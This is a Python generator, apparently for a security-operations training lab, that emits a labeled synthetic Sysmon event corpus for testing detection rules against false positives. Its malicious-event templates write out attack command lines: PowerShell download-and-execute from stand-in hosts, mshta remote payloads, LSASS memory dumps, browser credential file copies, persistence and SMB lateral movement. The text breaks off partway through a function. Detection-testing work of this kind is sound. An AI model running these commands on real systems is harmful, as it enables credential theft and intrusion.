"""Synthetic Windows/Sysmon event corpus for Wazuh AI SOC Lab Lesson 3.

Emits a labeled JSONL corpus students can run pySigma-converted rules against
to measure FALSE-POSITIVE rate against ground truth. Inspired by Bousseaden's
EVTX-ATTACK-SAMPLES but JSON-native (no binary EVTX parsing required).

Shape:
- ~70% benign baseline events across realistic Windows hosts (Sysmon EIDs
  1 / 3 / 13 / 22 — process creation, network, registry, DNS).
- ~20% benign NEAR-MISSES per technique (legitimate activity that LOOKS
  attack-shaped — MDM-issued PowerShell -EncodedCommand, app-installer
  schtasks, Slack/Spotify/Teams reg-Run-key autorun, login-script SMB
  net use, etc). These are the real FP surface; rules that match the
  attack constants but not the technique structure WILL FP on these.
- ~10% labeled malicious events covering 8 MITRE ATT&CK techniques,
  with 2-3 variant shapes per technique (different binaries achieving
  the same technique). Each technique uses the EID + field set real
  Sigma rules for that technique target.

Techniques covered:
    T1059.001  PowerShell encoded command execution
    T1003.001  LSASS memory dump (Mimikatz / comsvcs.dll variants)
    T1218.005  Mshta abuse from various parent processes
    T1053.005  Scheduled task persistence (multiple invocation shapes)
    T1547.001  Registry Run-key persistence (BOTH process AND EID 13 events)
    T1021.002  SMB lateral movement (process AND EID 3 paired events)
    T1071.004  DNS protocol C2 (EID 22 with QueryName/QueryType)
    T1555.003  Browser credential file access (multiple browsers)

Every event has a `_labels` field with ground truth — strip via
`--strip-labels` before sending events to the LLM during FP analysis.

Deterministic with --seed. Standard library only. Python 3.10+.

Usage:
    python3 generate_corpus.py --seed 42 --out windows-sysmon.jsonl
    python3 generate_corpus.py --seed 42 --strip-labels --out for-llm.jsonl
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
import sys
import uuid
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path

# ---------------------------------------------------------------------------
# Fleet inventory
# ---------------------------------------------------------------------------

WORKSTATIONS = [
    *(f"WS-ENG-{i:03d}" for i in range(1, 26)),
    *(f"WS-OPS-{i:03d}" for i in range(1, 11)),
    *(f"WS-FIN-{i:03d}" for i in range(1, 8)),
]
SERVERS = [
    *(f"SRV-WEB-{i:02d}" for i in range(1, 5)),
    *(f"SRV-FILE-{i:02d}" for i in range(1, 3)),
]
DCS = [f"DC-{i:02d}" for i in range(1, 4)]
ALL_HOSTS = WORKSTATIONS + SERVERS + DCS

# Compromisable users — humans who can be compromised AND show up in benign.
HUMAN_USERS = [
    "alice.eng", "bob.eng", "carla.ops", "dan.eng", "eve.fin", "felipe.eng",
    "grace.eng", "hans.ops", "ivy.fin", "jin.eng", "kai.eng", "luna.eng",
    "miguel.eng", "nora.fin", "omar.ops", "priya.eng", "quinn.fin",
    "rosa.eng", "sami.ops", "tara.eng", "uma.fin",
]
ADMIN_USERS = ["alice.admin", "carla.admin", "omar.admin"]  # also do legitimate work
SYSTEM_PRINCIPALS = ["SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE"]
SERVICE_ACCOUNTS = ["svc-deploy", "svc-backup", "svc-monitoring", "svc-edr"]
ALL_USERS = HUMAN_USERS + ADMIN_USERS + SYSTEM_PRINCIPALS + SERVICE_ACCOUNTS

# Writable user paths the technique payloads might write to (rotated).
WRITABLE_PATHS = [
    "C:\\Users\\Public",
    "C:\\Windows\\Temp",
    "C:\\ProgramData",
    "C:\\Users\\{user}\\AppData\\Local\\Temp",
    "C:\\Users\\{user}\\AppData\\Roaming",
]

# ---------------------------------------------------------------------------
# Benign baseline process catalog
# ---------------------------------------------------------------------------

BENIGN_PROCESSES = [
    # (image, original_file_name, command_line_template, parent_image)
    ("C:\\Windows\\System32\\svchost.exe", "svchost.exe",
     '"C:\\Windows\\System32\\svchost.exe" -k netsvcs -p',
     "C:\\Windows\\System32\\services.exe"),
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe",
     '"chrome.exe"', "C:\\Windows\\explorer.exe"),
    ("C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE", "OUTLOOK.EXE",
     '"OUTLOOK.EXE"', "C:\\Windows\\explorer.exe"),
    ("C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE", "WINWORD.EXE",
     '"WINWORD.EXE" /n "C:\\Users\\Documents\\status.docx"', "C:\\Windows\\explorer.exe"),
    ("C:\\Windows\\System32\\notepad.exe", "notepad.exe",
     '"notepad.exe"', "C:\\Windows\\explorer.exe"),
    ("C:\\Program Files\\PowerShell\\7\\pwsh.exe", "pwsh.exe",
     'pwsh.exe -NoProfile -Command Get-Service',
     "C:\\Windows\\System32\\WindowsTerminal.exe"),
    ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe",
     "powershell.exe -NoProfile -Command Get-ChildItem",
     "C:\\Windows\\System32\\cmd.exe"),
    ("C:\\Windows\\System32\\msiexec.exe", "msiexec.exe",
     "msiexec.exe /i C:\\temp\\update.msi /quiet",
     "C:\\Windows\\explorer.exe"),
    ("C:\\Program Files\\Microsoft VS Code\\Code.exe", "Code.exe",
     '"Code.exe"', "C:\\Windows\\explorer.exe"),
    ("C:\\Windows\\System32\\taskmgr.exe", "taskmgr.exe",
     "taskmgr.exe", "C:\\Windows\\explorer.exe"),
]

# ---------------------------------------------------------------------------
# Ground-truth labeling
# ---------------------------------------------------------------------------


@dataclass
class GenContext:
    rng: random.Random
    out: list[dict] = field(default_factory=list)


def _iso_z(dt: datetime) -> str:
    return dt.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _uuid(rng: random.Random) -> str:
    return str(uuid.UUID(int=rng.getrandbits(128)))


def _sha256(image: str, rng: random.Random) -> str:
    """Synthetic but stable SHA-256 — same image path → same hash."""
    return hashlib.sha256(image.encode()).hexdigest()


def _writable_dir(rng: random.Random, user: str) -> str:
    return rng.choice(WRITABLE_PATHS).replace("{user}", user)


def _biased_hour(rng: random.Random, base: datetime, malicious: bool) -> datetime:
    """Triangular bias toward business hours; malicious events get the same
    distribution (real adversaries operate during business hours too)."""
    h = int(rng.triangular(low=8, high=22, mode=14 if not malicious else 16))
    h = max(0, min(23, h))
    return base.replace(hour=h, minute=rng.randint(0, 59), second=rng.randint(0, 59))


# ---------------------------------------------------------------------------
# EID-specific event factories
# ---------------------------------------------------------------------------


def _process_event(
    ctx: GenContext, *, when: datetime, host: str, user: str,
    image: str, original_file_name: str, command_line: str,
    parent_image: str = "C:\\Windows\\explorer.exe",
    parent_command_line: str = "C:\\Windows\\Explorer.EXE",
    label_technique: str | None = None, label_malicious: bool = False,
    label_near_miss: bool = False,
) -> dict:
    return {
        "record_id": _uuid(ctx.rng),
        "@timestamp": _iso_z(when),
        "host": {"name": host},
        "user": {"name": user},
        "winlog": {
            "provider_name": "Microsoft-Windows-Sysmon",
            "event_id": 1,
            "event_data": {
                "Image": image,
                "OriginalFileName": original_file_name,
                "CommandLine": command_line,
                "ParentImage": parent_image,
                "ParentCommandLine": parent_command_line,
            },
        },
        "process": {
            "executable": image,
            "command_line": command_line,
            "name": original_file_name,
            "pid": ctx.rng.randint(1000, 9999),
            "hash": {"sha256": _sha256(image, ctx.rng)},
            "parent": {
                "executable": parent_image,
                "command_line": parent_command_line,
                "name": parent_image.rsplit("\\", 1)[-1],
            },
        },
        "_labels": {
            "technique": label_technique,
            "malicious": label_malicious,
            "near_miss": label_near_miss,
        },
    }


def _registry_event(
    ctx: GenContext, *, when: datetime, host: str, user: str,
    target_object: str, details: str, image: str,
    label_technique: str | None = None, label_malicious: bool = False,
    label_near_miss: bool = False,
) -> dict:
    """Sysmon EID 13 — RegistryEvent (Value Set)."""
    return {
        "record_id": _uuid(ctx.rng),
        "@timestamp": _iso_z(when),
        "host": {"name": host},
        "user": {"name": user},
        "winlog": {
            "provider_name": "Microsoft-Windows-Sysmon",
            "event_id": 13,
            "event_data": {
                "EventType": "SetValue",
                "TargetObject": target_object,
                "Details": details,
                "Image": image,
            },
        },
        "registry": {"path": target_object, "value": details},
        "_labels": {
            "technique": label_technique,
            "malicious": label_malicious,
            "near_miss": label_near_miss,
        },
    }


def _dns_event(
    ctx: GenContext, *, when: datetime, host: str, user: str,
    query_name: str, query_type: str, image: str,
    label_technique: str | None = None, label_malicious: bool = False,
    label_near_miss: bool = False,
) -> dict:
    """Sysmon EID 22 — DnsQuery."""
    return {
        "record_id": _uuid(ctx.rng),
        "@timestamp": _iso_z(when),
        "host": {"name": host},
        "user": {"name": user},
        "winlog": {
            "provider_name": "Microsoft-Windows-Sysmon",
            "event_id": 22,
            "event_data": {
                "QueryName": query_name,
                "QueryType": query_type,
                "Image": image,
            },
        },
        "dns": {"question": {"name": query_name, "type": query_type}},
        "_labels": {
            "technique": label_technique,
            "malicious": label_malicious,
            "near_miss": label_near_miss,
        },
    }


def _network_event(
    ctx: GenContext, *, when: datetime, host: str, user: str,
    src_ip: str, dst_ip: str, dst_port: int, dst_host: str | None,
    image: str, protocol: str = "tcp",
    label_technique: str | None = None, label_malicious: bool = False,
    label_near_miss: bool = False,
) -> dict:
    """Sysmon EID 3 — NetworkConnect."""
    return {
        "record_id": _uuid(ctx.rng),
        "@timestamp": _iso_z(when),
        "host": {"name": host},
        "user": {"name": user},
        "winlog": {
            "provider_name": "Microsoft-Windows-Sysmon",
            "event_id": 3,
            "event_data": {
                "Image": image,
                "Protocol": protocol,
                "DestinationIp": dst_ip,
                "DestinationPort": dst_port,
                "DestinationHostname": dst_host or "",
                "SourceIp": src_ip,
            },
        },
        "source": {"ip": src_ip},
        "destination": {"ip": dst_ip, "port": dst_port, "domain": dst_host},
        "network": {"transport": protocol},
        "_labels": {
            "technique": label_technique,
            "malicious": label_malicious,
            "near_miss": label_near_miss,
        },
    }


# ---------------------------------------------------------------------------
# Benign baseline events (mixed across EIDs 1 / 3 / 13 / 22)
# ---------------------------------------------------------------------------


def populate_benign(ctx: GenContext, n: int, start: datetime, end: datetime) -> None:
    span = max(1, int((end - start).total_seconds()))
    for _ in range(n):
        when = _biased_hour(ctx.rng, start + timedelta(seconds=ctx.rng.randint(0, span)), False)
        host = ctx.rng.choice(ALL_HOSTS)
        user = ctx.rng.choice(ALL_USERS)
        roll = ctx.rng.random()
        if roll < 0.65:
            # Process-creation events
            image, ofn, cmd_template, parent = ctx.rng.choice(BENIGN_PROCESSES)
            ctx.out.append(_process_event(
                ctx, when=when, host=host, user=user,
                image=image, original_file_name=ofn, command_line=cmd_template,
                parent_image=parent,
                parent_command_line=f'"{parent}"',
            ))
        elif roll < 0.80:
            # Network connections (corporate web traffic, internal HTTP)
            ctx.out.append(_network_event(
                ctx, when=when, host=host, user=user,
                src_ip=f"10.0.{ctx.rng.randint(1, 4)}.{ctx.rng.randint(2, 250)}",
                dst_ip=ctx.rng.choice(["52.95.110.1", "13.107.42.14", "172.217.4.46",
                                        f"10.0.{ctx.rng.randint(1, 4)}.{ctx.rng.randint(2, 250)}"]),
                dst_port=ctx.rng.choice([443, 80, 445, 88, 53, 3389]),
                dst_host=ctx.rng.choice(["microsoft.com", "google.com", None]),
                image=ctx.rng.choice([p[0] for p in BENIGN_PROCESSES]),
            ))
        elif roll < 0.92:
            # Registry SetValue events (legitimate app config writes)
            value_name = ctx.rng.choice(["EnableFeature", "LastUpdateCheck", "UserPreferences",
                                          "Theme", "DefaultBrowser"])
            ctx.out.append(_registry_event(
                ctx, when=when, host=host, user=user,
                target_object=f"HKU\\<sid>\\Software\\{ctx.rng.choice(['Microsoft', 'Google', 'Mozilla'])}\\Settings\\{value_name}",
                details=ctx.rng.choice(["DWORD (0x00000001)", "DWORD (0x00000000)", "QWORD (0x...)"]),
                image=ctx.rng.choice([p[0] for p in BENIGN_PROCESSES]),
            ))
        else:
            # DNS queries — common corporate destinations
            qname = ctx.rng.choice([
                "outlook.office365.com", "graph.microsoft.com", "login.microsoftonline.com",
                "dl.google.com", "update.googleapis.com", "github.com",
                "registry.npmjs.org", "pypi.org", "datadoghq.com",
            ])
            ctx.out.append(_dns_event(
                ctx, when=when, host=host, user=user,
                query_name=qname, query_type=ctx.rng.choice(["A", "AAAA", "HTTPS"]),
                image="C:\\Windows\\System32\\svchost.exe",
            ))


# ---------------------------------------------------------------------------
# Malicious patterns — multiple variants per technique
# ---------------------------------------------------------------------------


def _b64_payload(rng: random.Random, length: int = 76) -> str:
    return "".join(rng.choices(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
        k=length,
    ))


def _plant_t1059_001(ctx: GenContext, when: datetime, host: str, user: str) -> None:
    """PowerShell encoded command — multiple variants."""
    variant = ctx.rng.randint(0, 2)
    image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    parent_image = ctx.rng.choice([
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
        "C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE",
        "C:\\Windows\\explorer.exe",
        "C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE",
    ])
    if variant == 0:
        cmd = f"{image} -NoProfile -ExecutionPolicy Bypass -EncodedCommand {_b64_payload(ctx.rng, 76)}"
    elif variant == 1:
        cmd = f"{image} -nop -w hidden -enc {_b64_payload(ctx.rng, ctx.rng.randint(60, 200))}"
    else:
        # IEX downloadstring shape — different invocation, same technique
        domain = ctx.rng.choice(["pastebin-mirror.example", "cdn-update.example", "github-raw.example"])
        cmd = (f'{image} -NoProfile -Command "IEX (New-Object Net.WebClient)'
               f'.DownloadString(\'https://{domain}/x/{_b64_payload(ctx.rng, 8)}\')"')
    ctx.out.append(_process_event(
        ctx, when=when, host=host, user=user,
        image=image, original_file_name="powershell.exe",
        command_line=cmd, parent_image=parent_image,
        parent_command_line=f'"{parent_image}"',
        label_technique="T1059.001", label_malicious=True,
    ))


def _plant_t1003_001(ctx: GenContext, when: datetime, host: str) -> None:
    """LSASS dump — multiple variants and users."""
    variant = ctx.rng.randint(0, 2)
    user = ctx.rng.choice(["SYSTEM", *ADMIN_USERS, "svc-deploy"])
    out_dir = _writable_dir(ctx.rng, user if user not in SYSTEM_PRINCIPALS else "Public")
    out_name = ctx.rng.choice(["lsass.dmp", "out.dmp", "system.bin", "memory.bin", "core.dump"])
    if variant == 0:
        # comsvcs.dll MiniDump
        image = "C:\\Windows\\System32\\rundll32.exe"
        cmd = (f"{image} C:\\Windows\\System32\\comsvcs.dll, MiniDump "
               f"{ctx.rng.randint(400, 800)} {out_dir}\\{out_name} full")
    elif variant == 1:
        # ProcDump-shaped (renamed binary scenario — OriginalFileName matters)
        image = f"{out_dir}\\update-helper.exe"
        cmd = f"{image} -accepteula -ma lsass.exe {out_dir}\\{out_name}"
        ctx.out.append(_process_event(
            ctx, when=when, host=host, user=user,
            image=image, original_file_name="procdump.exe",  # the giveaway
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            parent_command_line="cmd.exe",
            label_technique="T1003.001", label_malicious=True,
        ))
        return
    else:
        # PowerShell Out-Minidump
        image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        cmd = (f"{image} -NoProfile -Command \"Get-Process lsass | Out-Minidump "
               f"-DumpFilePath {out_dir}\\{out_name}\"")
    parent = ctx.rng.choice([
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    ])
    ctx.out.append(_process_event(
        ctx, when=when, host=host, user=user,
        image=image,
        original_file_name=image.rsplit("\\", 1)[-1],
        command_line=cmd, parent_image=parent,
        parent_command_line=f'"{parent}"',
        label_technique="T1003.001", label_malicious=True,
    ))


def _plant_t1218_005(ctx: GenContext, when: datetime, host: str, user: str) -> None:
    """Mshta abuse — varied parents and URL shapes."""
    image = "C:\\Windows\\System32\\mshta.exe"
    parent = ctx.rng.choice([
        "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
        "C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE",
        "C:\\Program Files\\Microsoft Office\\Office16\\OUTLOOK.EXE",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\explorer.exe",
    ])
    domain = ctx.rng.choice([
        "cdn-static-asset.example", "files-update-svc.example",
        f"{_b64_payload(ctx.rng, 12).lower()}.{ctx.rng.choice(['top', 'xyz', 'click'])}",
    ])
    cmd = f'{image} https://{domain}/payload.hta'
    ctx.out.append(_process_event(
        ctx, when=when, host=host, user=user,
        image=image, original_file_name="MSHTA.EXE",
        command_line=cmd, parent_image=parent,
        parent_command_line=f'"{parent}"',
        label_technique="T1218.005", label_malicious=True,
    ))


def _plant_t1053_005(ctx: GenContext, when: datetime, host: str, user: str) -> None:
    """Scheduled task persistence — multiple shapes."""
    variant = ctx.rng.randint(0, 1)
    if variant == 0:
        image = "C:\\Windows\\System32\\schtasks.exe"
        task_name = ctx.rng.choice([
            "Microsoft\\Windows\\UpdateOrchestrator\\Maintenance",
            "Microsoft\\Windows\\Defender\\Telemetry",
            "MicrosoftEdgeUpdateBrowserReplacement",
        ])
        target = ctx.rng.choice([
            f'powershell -nop -w hidden -enc {_b64_payload(ctx.rng, 60)}',
            f'mshta https://{_b64_payload(ctx.rng, 8).lower()}.example/p.hta',
            f'cmd /c "C:\\Users\\Public\\update.exe"',
        ])
        cmd = (f'{image} /create /tn "{task_name}" /tr "{target}" '
               f'/sc {ctx.rng.choice(["onlogon", "minute /mo 5", "daily /st 03:00"])} '
               f'/ru SYSTEM /f')
        ofn = "schtasks.exe"
    else:
        # PowerShell Register-ScheduledTask shape
        image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        ofn = "powershell.exe"
        cmd = (f'{image} -NoProfile -Command "Register-ScheduledTask -TaskName '
               f'\'WindowsUpdateCheck\' -Action (New-ScheduledTaskAction -Execute '
               f'\'powershell\' -Argument \'-enc {_b64_payload(ctx.rng, 40)}\') '
               f'-Trigger (New-ScheduledTaskTrigger -AtLogOn) -RunLevel Highest"')
    ctx.out.append(_process_event(
        ctx, when=when, host=host, user=user,
        image=image, original_file_name=ofn,
        command_line=cmd,
        parent_image="C:\\Windows\\System32\\cmd.exe",
        parent_command_line="cmd.exe",
        label_technique="T1053.005", label_malicious=True,
    ))


def _plant_t1547_001(ctx: GenContext, when: datetime, host: str, user: str) -> None:
    """Run-key persistence — emit BOTH the process AND the registry event."""
    hive = ctx.rng.choice(["HKCU", "HKLM"])
    run_path = ctx.rng.choice([
        f"{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        f"{hive}\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    ])
    value_name = ctx.rng.choice([
        "WindowsUpdate", "MicrosoftEdgeUpdate", "AdobeReaderHelper",
        "OneDriveSetup", "SystemHealthCheck",
    ])
    target_path = (f"{_writable_dir(ctx.rng, user)}\\"
                   f"{ctx.rng.choice(['update.exe', 'helper.exe', 'svc.dll', 'check.bat'])}")

    variant = ctx.rng.randint(0, 1)
    if variant == 0:
        # reg.exe add (process event + paired registry event)
        image = "C:\\Windows\\System32\\reg.exe"
        cmd = f'{image} add "{run_path}" /v "{value_name}" /t REG_SZ /d "{target_path}" /f'
        ctx.out.append(_process_event(
            ctx, when=when, host=host, user=user,
            image=image, original_file_name="reg.exe",
            command_line=cmd,
            label_technique="T1547.001", label_malicious=True,
        ))
        ctx.out.append(_registry_event(
            ctx, when=when + timedelta(milliseconds=10), host=host, user=user,
            target_object=f"{run_path}\\{value_name}",
            details=target_path, image=image,
            label_technique="T1547.001", label_malicious=True,
        ))
    else:
        # PowerShell Set-ItemProperty path (no reg.exe — different rule needed)
        image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        cmd = (f'{image} -NoProfile -Command "Set-ItemProperty -Path '
               f'\'{run_path}\' -Name \'{value_name}\' -Value \'{target_path}\'"')
        ctx.out.append(_process_event(
            ctx, when=when, host=host, user=user,
            image=image, original_file_name="powershell.exe",
            command_line=cmd,
            label_technique="T1547.001", label_malicious=True,
        ))
        ctx.out.append(_registry_event(
            ctx, when=when + timedelta(milliseconds=10), host=host, user=user,
            target_object=f"{run_path}\\{value_name}",
            details=target_path, image=image,
            label_technique="T1547.001", label_malicious=True,
        ))


def _plant_t1021_002(ctx: GenContext, when: datetime, src: str, dst: str, user: str) -> None:
    """SMB lateral movement — process + paired network connect."""
    image = "C:\\Windows\\System32\\net.exe"
    share = ctx.rng.choice(["C$", "ADMIN$", f"C$\\Windows\\Temp"])
    auth_user = ctx.rng.choice([f"CORP\\{user}", "CORP\\administrator", f"CORP\\{ctx.rng.choice(ADMIN_USERS)}"])
    cmd = f'{image} use \\\\{dst}\\{share} /user:{auth_user}'
    ctx.out.append(_process_event(
        ctx, when=when, host=src, user=user,
        image=image, original_file_name="net.exe",
        command_line=cmd,
        label_technique="T1021.002", label_malicious=True,
    ))
    # Paired network connection to SMB port (445)
    ctx.out.append(_network_event(
        ctx, when=when + timedelta(milliseconds=50), host=src, user=user,
        src_ip=f"10.0.{ctx.rng.randint(1, 4)}.{ctx.rng.randint(2, 250)}",
        dst_ip=f"10.0.{ctx.rng.randint(1, 4)}.{ctx.rng.randint(2, 250)}",
        dst_port=445, dst_host=dst, image=image, protocol="tcp",
        label_technique="T1021.002", label_malicious=True,
    ))


def _plant_t1071_004(ctx: GenContext, when: datetime, host: str) -> None:
    """DNS C2 — DNS event with long base32-shape qname."""
    qname = (
        "".join(ctx.rng.choices("abcdefghijklmnopqrstuvwxyz234567", k=ctx.rng.randint(45, 70)))
        + "." + ctx.rng.choice(["tunnel.example", "c2-relay.example", "data-exfil.example"])
    )
    user = ctx.rng.choice(HUMAN_USERS)
    ctx.out.append(_dns_event(
        ctx, when=when, host=host, user=user,
        query_name=qname,
        query_type=ctx.rng.choice(["TXT", "A", "AAAA"]),
        image=ctx.rng.choice([
            "C:\\Windows\\System32\\nslookup.exe",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "C:\\Users\\Public\\helper.exe",
        ]),
        label_technique="T1071.004", label_malicious=True,
    ))


def _plant_t1555_003(ctx: GenContext, when: datetime, host: str, user: str) -> None:
    """Browser credential file access — multiple browsers + tools."""
    browser = ctx.rng.choice(["Chrome", "Edge", "Brave"])
    src_paths = {
        "Chrome": f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
        "Edge":   f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
        "Brave":  f"C:\\Users\\{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
    }
    src = src_paths[browser]
    dst = f"{_writable_dir(ctx.rng, user)}\\{ctx.rng.choice(['login.dat', 'creds.bin', 'browser.db'])}"
    image = ctx.rng.choice([
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\xcopy.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    ])
    if "powershell" in image.lower():
        cmd = f'{image} -NoProfile -Command "Copy-Item -Path \'{src}\' -Destination \'{dst}\'"'
    elif "xcopy" in image.lower():
        cmd = f'{image} "{src}" "{dst}" /Y'
    else:
        cmd = f'{image} /c copy "{src}" "{dst}"'
    ctx.out.append(_process_event(
        ctx, when=when, host=host, user=user,
        image=image, original_file_name=image.rsplit("\\", 1)[-1],
        command_line=cmd,
        label_technique="T1555.003", label_malicious=True,
    ))


# ---------------------------------------------------------------------------
# Benign near-misses — the FP surface that makes FP rate measurement meaningful
# ---------------------------------------------------------------------------


def _near_miss_powershell_enc(ctx: GenContext, when: datetime, host: str) -> None:
    """Legitimate -EncodedCommand (Intune / MDM / installer / EDR)."""
    image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    parent = ctx.rng.choice([
        "C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe",
        "C:\\Program Files\\Windows Defender Advanced Threat Protection\\MsSense.exe",
        "C:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Microsoft.Management.Services.IntuneWindowsAgent.exe",
        "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
    ])
    cmd = f"{image} -NoProfile -EncodedCommand {_b64_payload(ctx.rng, 80)}"
    ctx.out.append(_process_event(
        ctx, when=when, host=host, user="SYSTEM",
        image=image, original_file_name="powershell.exe",
        command_line=cmd, parent_image=parent,
        parent_command_line=f'"{parent}"',
        label_near_miss=True,
    ))


def _near_miss_schtasks(ctx: GenContext, when: datetime, host: str, user: str) -> None:
    """App installer creating its own scheduled task — common in real fleets."""
    image = "C:\\Windows\\System32\\schtasks.exe"
    task_choice = ctx.rng.choice([
        ("GoogleUpdateTaskMachineUA", '"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe" /ua /installsource scheduler'),
        ("OneDrive Standalone Update Task v2", '"C:\\Users\\username\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe"'),
        ("Adobe Acrobat Update Task", '"C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe"'),
        ("MicrosoftEdgeUpdateTaskMachineCore", '"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe" /c'),
    ])
    cmd = f'{image} /create /tn "{task_choice[0]}" /tr "{task_choice[1]}" /sc daily /st 09:00 /f'
    ctx.out.append(_process_event(
        ctx, when=when, host=host, user=user,
        image=image, original_file_name="schtasks.exe",
        command_line=cmd,
        parent_image=ctx.rng.choice([
            "C:\\Windows\\System32\\msiexec.exe",
            "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
        ]),
        parent_command_line="installer",
        label_near_miss=True,
    ))


def _near_miss_run_key(ctx: GenContext, when: datetime, host: str, user: str) -> None:
    """Legitimate apps writing their own autorun (Spotify / Slack / Teams / Steam)."""
    app = ctx.rng.choice([
        ("Spotify", f"C:\\Users\\{user}\\AppData\\Roaming\\Spotify\\Spotify.exe"),
        ("com.squirrel.Slack.slack", f"C:\\Users\\{user}\\AppData\\Local\\slack\\slack.exe --autostart"),
        ("Teams", f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Teams\\Update.exe --processStart Teams.exe"),
        ("Steam", f"\"C:\\Program Files (x86)\\Steam\\steam.exe\" -silent"),
        ("Discord", f"C:\\Users\\{user}\\AppData\\Local\\Discord\\Update.exe --processStart Discord.exe"),
    ])
    run_path = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    ctx.out.append(_registry_event(
        ctx, when=when, host=host, user=user,
        target_object=f"{run_path}\\{app[0]}",
        details=app[1],
        image=ctx.rng.choice([
            "C:\\Windows\\System32\\msiexec.exe",
            f"C:\\Users\\{user}\\AppData\\Roaming\\Spotify\\Spotify.exe",
            "C:\\Program Files\\WindowsApps\\Microsoft.Teams\\setup.exe",
        ]),
        label_near_miss=True,
    ))


def _near_miss_smb(ctx: GenContext, when: datetime, host: str, user: str) -> None:
    """Legitimate SMB use (login script / Group Policy / file-share access)."""
    image = "C:\\Windows\\System32\\net.exe"
    target_host = ctx.rng.choice(["fileserver01", "share01", "dfs.corp.example", "SRV-FILE-01"])
    share = ctx.rng.choice(["share", "deploy", "users$", "homes"])
    cmd = ctx.rng.choice([
        f'{image} use \\\\{target_host}\\{share}',
        f'{image} use H: \\\\{target_host}\\users$\\{user}',
    ])
    parent = ctx.rng.choice([
        "C:\\Windows\\System32\\userinit.exe",       # login script
        "C:\\Windows\\System32\\gpscript.exe",       # GP startup script
    ])
    ctx.out.append(_process_event(
        ctx, when=when, host=host, user=user,
        image=image, original_file_name="net.exe",
        command_line=cmd, parent_image=parent,
        parent_command_line=f'"{parent}"',
        label_near_miss=True,
    ))


def _near_miss_rundll32(ctx: GenContext, when: datetime, host: str, user: str) -> None:
    """Legitimate rundll32 invocations (control panel, printer, Windows utilities)."""
    image = "C:\\Windows\\System32\\rundll32.exe"
    target = ctx.rng.choice([
        "shell32.dll, Control_RunDLL",
        "printui.dll, PrintUIEntry /im",
        "user32.dll, LockWorkStation",
        "advapi32.dll, ProcessIdleTasks",
    ])
    cmd = f"{image} {target}"
    ctx.out.append(_process_event(
        ctx, when=when, host=host, user=user,
        image=image, original_file_name="RUNDLL32.EXE",
        command_line=cmd,
        parent_image=ctx.rng.choice([
            "C:\\Windows\\explorer.exe",
            "C:\\Windows\\System32\\sihost.exe",
        ]),
        parent_command_line="explorer.exe",
        label_near_miss=True,
    ))


def _near_miss_mshta(ctx: GenContext, when: datetime, host: str, user: str) -> None:
    """Legitimate mshta (sysadmin .hta tool, in-app help)."""
    image = "C:\\Windows\\System32\\mshta.exe"
    target = ctx.rng.choice([
        f"C:\\Users\\{user}\\Documents\\IT\\support-form.hta",
        "C:\\ProgramData\\IT-tools\\inventory.hta",
        "vbscript:Close(Execute(\"MsgBox \\\"hello\\\"\"))",  # Microsoft KB-shape
    ])
    cmd = f'{image} "{target}"'
    ctx.out.append(_process_event(
        ctx, when=when, host=host, user=user,
        image=image, original_file_name="MSHTA.EXE",
        command_line=cmd,
        parent_image="C:\\Windows\\explorer.exe",
        parent_command_line="explorer.exe",
        label_near_miss=True,
    ))


def _near_miss_dns_long(ctx: GenContext, when: datetime, host: str) -> None:
    """Legitimate DNS queries that look long/random (CDN, telemetry, ETW)."""
    qname = ctx.rng.choice([
        f"d{ctx.rng.randint(100, 9999)}.cloudfront.net",
        f"v10.events.data.microsoft.com",
        f"{_b64_payload(ctx.rng, 12).lower()}.akamaized.net",
